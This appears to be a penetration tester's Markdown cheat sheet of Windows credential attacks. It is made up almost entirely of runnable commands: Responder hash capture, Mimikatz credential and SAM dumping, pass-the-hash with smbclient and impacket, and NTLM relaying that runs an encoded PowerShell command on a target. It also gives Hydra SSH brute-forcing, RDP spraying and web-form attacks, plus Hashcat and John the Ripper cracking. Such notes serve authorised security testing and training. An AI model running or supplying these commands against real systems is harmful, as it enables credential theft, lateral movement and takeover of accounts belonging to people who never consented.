## Getting passwords/hashes on Windows 

### Responder  

Initialize responder on an interface
```
sudo responder -I eth0
```

Force a connection to a UNC share at the IP address where responder is listening  
```
\\192.168.1.10\share
```


### Mimikatz  

Run mimikatz as an admin  
```
PS> .\mimikatz.exe
```  

Enable SeDebugPrivilege  
```
privilege::debug
```

Obtain SYSTEM privs  
```
token::elevate
```  

Dump hashes fromthe SAM database  
```
lsadump::sam 
```  

Get passwords/hashes from multiple places  
```
sekurlsa::logonpasswords
```

## Passing the hash  

SMBClient  
```
smbclient \\\\10.10.10.42\\share -U Administrator --pw-nt-hash 9a48310ea6f5fdfee955abed1762964b
```  

Impacket-psexec (executes as SYSTEM)
```
impacket-psexec -hashes 00000000000000000000000000000000:9a48310ea6f5fdfee955abed1762964b Administrator@10.10.10.42
```  

Impacket-wmiexec (executes as user)  
```
impacket-wmiexec -hashes 00000000000000000000000000000000:9a48310ea6f5fdfee955abed1762964b Administrator@10.10.10.42
```

## Relaying a hash

Start SMB server to catch NTLMv2, and when a connection occurs, relay NTLMv2 to the target, and execute a command on the target.
```
impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.10.42 -c "powershell -enc JABj..."
```

## Commands/Tools to guess passwords against network services  

### Hydra  

SSH wordlist attack 
``` 
hydra -l myuser -P password.list -s 2222 ssh://10.10.10.43
```

RDP password spray
``` 
hydra -L username.list -p "myPassword123" rdp://10.10.10.43
```

HTTP wordlist attack
```
hydra -l myuser -P password.list 10.10.10.43 http-post-form "/login:user_param=user&password_param=^PASS^:Failure Message"
```

## Password cracking

### Hashcat

Useful blog posts that I had written:  
* https://web.archive.org/web/20210615060624/https://laconicwolf.com/2018/09/29/hashcat-tutorial-the-basics-of-cracking-passwords-with-hashcat/  
* https://web.archive.org/web/20210615064601/https://laconicwolf.com/2019/03/29/hashcat-tutorial-rule-writing/

Finding hash mode  
```
hashcat --help | grep -i "hashtype"
```

#### Password math  

Calculate total number of possibilities  
```
charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
password_length = 8
total_possibilities = len(charset) ** password_length
```

Benchmark Hashcat
```
hashcat -b
```

Calculate time
```  
time_in_seconds = total_possibilities / benchmark_for_hash_type
```


#### Example commands  

Cracking a keepass database hash with a wordlist and rules  
```
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
```

### John-the-Ripper and Hashcat 

Adding Hashcat rules to JTR  
```
sudo nano /etc/john/john.conf

# Append to end of file
[List.Rules:myCustomRules]
c $1 $2 $3 $!
c $1 $2 $3 $@
c $1 $2 $3 $#
```

Using JTR to format hashes  
```ssh2john ../Downloads/id_rsa > ssh.hash```  
There are many hash conversion scripts  
```
$ locate *2john 
/usr/bin/1password2john
/usr/bin/7z2john
/usr/bin/DPAPImk2john
...
```

### John-the-Ripper  
```
john --wordlist=ssh.passwords --rules=myCustomRules ssh.hash
```
